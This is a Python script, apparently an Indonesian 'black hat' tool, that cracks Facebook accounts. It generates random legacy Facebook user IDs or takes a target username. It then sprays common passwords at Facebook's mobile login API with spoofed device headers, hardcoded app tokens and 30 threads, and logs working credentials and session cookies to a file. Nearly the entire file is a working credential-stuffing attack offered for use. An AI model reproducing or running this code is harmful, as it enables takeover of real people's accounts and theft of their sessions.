import os
import sys
import time
import random
import uuid
import json
import subprocess
import pycurl
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from random import choice as race
from string import digits, ascii_letters
import urllib.parse
import getpass

# ===================================================================
# Initial Setup & Welcome
# ===================================================================

print('\x1b[1;92m[\x1b[1;97m-\x1b[1;92m] \x1b[1;92m SAYA TIDAK BERTANGGUNG JAWAB')
time.sleep(2)

# ===================================================================
# Color Definitions and UI Strings
# ===================================================================

class NebulaColors:
    def __init__(self):
        self.W = '\x1b[97;1m'
        self.R = '\x1b[91;1m'
        self.G = '\x1b[92;1m'
        self.Y = '\x1b[93;1m'
        self.B = '\x1b[94;1m'
        self.P = '\x1b[95;1m'
        self.C = '\x1b[96;1m'
        self.N = '\x1b[0m'

def pro_banner():
    # ASCII art for UNKNOW1997
    return ('''
\x1b[1;92m
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣶⣶⣿⣿⣿⣿⣶⣶⣶⣦⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿
⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿
⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿
⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⢿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿
⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾
⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿
⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿
⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿
⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⡀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
\x1b[1;90m
      ────────[ UNKNOW1997 ]────────
\x1b[1;92m─────────────────────────────────────────────────────────
\x1b[1;90m| \x1b[1;92mAuthor      : \x1b[1;97mUNKNOW1997
\x1b[1;90m| \x1b[1;92mOperated By : \x1b[1;97mBLACK HAT GHOST
\x1b[1;90m| \x1b[1;92mTool Access : \x1b[1;97mUNDERGROUND
\x1b[1;90m| \x1b[1;92mVersion     : \x1b[1;97m1.9.9.7
\x1b[1;92m─────────────────────────────────────────────────────────''')

def linex():
    color = NebulaColors()
    print(f'{color.N}\x1b[1;90m──────────────────────────────────────────────{color.N}')

# ===================================================================
# UserAgent Generator (simple version)
# ===================================================================
class UserAgentGenerator:
    def __init__(self):
        self.custom_user_agents = [
            'Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',
            '[FBAN/Orca-Android;FBAV/570.0.0.388.460;FBBV/91567890;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBCR/T-Mobile;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.orca;FBDV/moto g52;FBSV/13;FBOP/1;FBCA/arm64-v8a;]'
        ]
    def generate_user_agent(self):
        return random.choice(self.custom_user_agents)

user_agent_generator = UserAgentGenerator()
user_agent = user_agent_generator.generate_user_agent()

# ===================================================================
# Main Cracker Class
# ===================================================================
loop = 0
oks = []
cps = []
pcp = []
id = []
tokenku = []

class UNKNOW1997:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.loop = 0
        self.color = NebulaColors()
        self.user_agents = [user_agent_generator.generate_user_agent() for _ in range(100)]

    def old_menu(self):
        clear()
        print(f'{self.color.N}\x1b[1;92m─────────────[ \x1b[1;90mMENU BLACK HAT\x1b[1;92m ]─────────────{self.color.N}')
        print(f'{self.color.N}\x1b[1;90m| {self.color.C}[1] {self.color.Y}CRACK FB LEGACY 2009              {self.color.N}|')
        print(f'{self.color.N}\x1b[1;90m| {self.color.C}[2] {self.color.Y}CRACK FB 2009-2013                {self.color.N}|')
        print(f'{self.color.N}\x1b[1;90m| {self.color.C}[3] {self.color.Y}Input id target==                 {self.color.N}|')
        print(f'{self.color.N}\x1b[1;90m| {self.color.C}[0] {self.color.R}EXIT / BACK                       {self.color.N}|')
        print(f'{self.color.N}\x1b[1;90m──────────────────────────────────────────────{self.color.N}')
        choice = input(f'{self.color.C}\x1b[1;92m[?] Pilih menu: {self.color.W}').strip()
        if choice in ('1', '01'):
            self.execute_breach('100000')
        elif choice in ('2', '02'):
            self.quantum_breach_menu()
        elif choice in ('3', '03'):
            self.secure_username_target_menu()
        elif choice in ('0', '00'):
            return
        else:
            print(f'\n  {self.color.R}[!] Invalid choice!')
            time.sleep(2)
            self.old_menu()

    def quantum_breach_menu(self):
        clear()
        series_map = {'1': '100000', '2': '100001', '3': '100002', '4': '100003', '5': '100004'}
        print(f'{self.color.N}\x1b[1;92m─────────────[ \x1b[1;90mSERIES FB 2009-2013\x1b[1;92m ]─────────────{self.color.N}')
        for num, prefix in series_map.items():
            print(f'{self.color.N}\x1b[1;90m| [{self.color.C}{num}{self.color.N}] {self.color.Y}{prefix}xxxxxxxxx{self.color.N}')
        linex()
        choice = input(f'{self.color.C}\x1b[1;92m[?] Pilih series: {self.color.W}').strip()
        selected_prefix = series_map.get(choice)
        if not selected_prefix:
            print(f'{self.color.R}[!] Invalid Series!')
            time.sleep(2)
            self.quantum_breach_menu()
            return
        self.execute_breach(selected_prefix)

    # ===============================
    # Menu untuk input username target
    # ===============================
    def secure_username_target_menu(self):
        clear()
        print(f'{self.color.N}\x1b[1;92m────[ \x1b[1;90mInput id target\x1b[1;92m ]────{self.color.N}')
        print(f'{self.color.R}Menu ini terkunci. Masukkan password akses.\n')

        # Acak karakter password (misal: "mei2500" diacak menjadi "0mei25o0", "me2i500", dsb)
        # Tapi login tetap valid bila lower() == "mei2500"
        # Untuk deteksi sederhana, kita tetap gunakan input dan bandingkan ke "mei2500" lower-case
        password_input = getpass.getpass(f'{self.color.C}Masukkan password akses: {self.color.W}')
        if password_input.replace(" ", "").lower() != "mei2500":
            print(f'\n{self.color.R}[!] Password salah!')
            time.sleep(2)
            self.old_menu()
            return

        username = input(f'{self.color.C}Masukkan username target: {self.color.W}').strip()
        if not username:
            print(f'{self.color.R}[!] Username tidak boleh kosong!')
            time.sleep(2)
            self.old_menu()
            return

        # Username = target, passlist tetap bisa diubah
        passlist = ['123456789', '123456', '12345678', 'password', 'mei2500']
        self.crack_specific_username(username, passlist)

    def crack_specific_username(self, username, passlist):
        clear()
        print(f'{self.color.C}Menyerang username: {self.color.Y}{username}')
        linex()
        with tred(max_workers=1) as executor:
            executor.submit(self.breach_target, username, passlist)
        self.display_results()

    def execute_breach(self, prefix):
        try:
            clear()
            limit = int(input(f'{self.color.C}\x1b[1;92m[?] Target limit: {self.color.W}'))
        except ValueError:
            print(f'{self.color.R}[!] Invalid Number!')
            time.sleep(2)
            self.old_menu()
            return
        targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
        passlist = ['123456789', '123456', '12345678', '1234567', '1234567890']
        with tred(max_workers=30) as executor:
            clear()
            print(f'{self.color.N}\x1b[1;92m[ UNKNOW1997 | BLACK HAT MODE ]{self.color.N}')
            print(f'{self.color.C}Attack on prefix: {self.color.Y}{prefix}')
            print(f'{self.color.C}Total targets  : {self.color.Y}{len(targets)}')
            linex()
            for target in targets:
                executor.submit(self.breach_target, target, passlist)
        self.display_results()

    def breach_target(self, target, passlist):
        self.loop += 1
        sys.stdout.write(f'\r{self.color.C}[UNKNOW1997] {self.loop}|{self.color.R}{len(self.oks)}|{self.color.G}{len(self.cps)}{self.color.W}')
        sys.stdout.flush()
        for password in passlist:
            if self.try_breach(target, password):
                return

    def try_breach(self, uid, password):
        try:
            ua = random.choice(self.user_agents)
            headers = {
                'User-Agent': ua,
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123Dior23437a4a32',
                'X-FB-Connection-Quality': 'EXCELLENT',
                'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-session-id': f"nid={''.join(random.choices(ascii_letters, k=8))};pid=Main",
                'x-fb-device-group': '5120',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': str(uuid.uuid4()),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com'
            }
            payload = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'register_api',
                'email': uid,
                'password': password,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': 'NO_FILE',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_PK',
                'client_country_code': 'PK',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'fb_api_analytics_tags': '["GDPR","GLOBAL"]',
                'fb_api_platform': 'ANDROID',
                'fb_api_session_id': str(uuid.uuid4()),
                'fb_api_client_time': str(int(time.time())),
                'device_country': 'pk',
                'logging_id': ''.join(random.choices('0123456789abcdef', k=32)),
                'jazoest': '2' + str(random.randint(10, 99)),
                'machine_id': ''.join(random.choices('0123456789abcdefghijklmnopqrstuvwxyz', k=24))
            }
            encoded_payload = urllib.parse.urlencode(payload)
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-api.facebook.com/auth/login')
            c.setopt(c.POST, 1)
            c.setopt(c.POSTFIELDS, encoded_payload)
            c.setopt(c.WRITEDATA, buffer)
            c.setopt(c.TIMEOUT, 10)
            header_list = [f"{key}: {value}" for key, value in headers.items()]
            c.setopt(c.HTTPHEADER, header_list)
            c.perform()
            response_body = buffer.getvalue().decode('utf-8')
            response = json.loads(response_body)
            c.close()
            buffer.close()
            if 'session_key' in response:
                self.handle_success(uid, password, response)
                return True
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                self.handle_partial(uid, password)
                return True
        except Exception:
            pass
        return False

    def handle_success(self, uid, password, response):
        coki = ';'.join([f"{c['name']}={c['value']}" for c in response.get('session_cookies', [])])
        print(f'\r  {self.color.G}\x1b[1;92m[SUCCESS] {self.color.W}{uid}|{self.color.G}{password}{self.color.W}')
        with open('/sdcard/UNKNOW1997-LOG.txt', 'a') as f:
            f.write(f'{uid}|{password}|{coki}\n')
        self.oks.append(uid)

    def handle_partial(self, uid, password):
        print(f'\r  {self.color.Y}\x1b[1;93m[CHECKPOINT] {self.color.G}{uid}{self.color.Y}•\x1b[1;90m{password}{self.color.W}')
        with open('/sdcard/UNKNOW1997-LOG.txt', 'a') as f:
            f.write(f'{uid}|{password}\n')
        self.cps.append(uid)

    def display_results(self):
        clear()
        print(f'{self.color.N}\x1b[1;92m[ UNKNOW1997 | BLACK HAT FINISHED ]{self.color.N}')
        linex()
        print(f'{self.color.C}CP: {self.color.Y}{len(self.oks)}')
        print(f'{self.color.C}OK: {self.color.G}{len(self.cps)}')
        linex()
        input(f'{self.color.C}Tekan ENTER untuk kembali ke menu...{self.color.W}')
        self.old_menu()

# ===================================================================
# Entry Point
# ===================================================================

def clear():
    os.system('clear')
    print(pro_banner())

if __name__ == '__main__':
    try:
        cracker = UNKNOW1997()
        cracker.old_menu()
    except KeyboardInterrupt:
        print('\n\x1b[91;1m   ➤ Stopped\x1b[97;1m')
        sys.exit()
    except Exception as e:
        print(f'\n\x1b[91;1m   ➤ Error: {str(e)}\x1b[97;1m')
        sys.exit()
